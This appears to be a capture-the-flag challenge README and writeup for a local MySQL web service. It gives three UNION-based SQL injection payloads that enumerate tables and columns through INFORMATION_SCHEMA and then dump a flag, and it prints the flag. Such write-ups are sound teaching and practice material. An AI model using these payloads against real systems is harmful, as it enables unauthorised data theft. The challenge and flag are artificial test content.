# sql_injection
`mysql`でなんか作ってみたよ！

```
http://localhost:30010/
```
## writeup

' UNION SELECT TABLE_NAME, TABLE_TYPE FROM INFORMATION_SCHEMA.TABLES #

' UNION SELECT COLUMN_NAME, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "flag_table" #

' union select flag, 1 from flag_table #


```
flag{SQL_1NJECT10N_4ND_LEAK_T4BLES!!}
```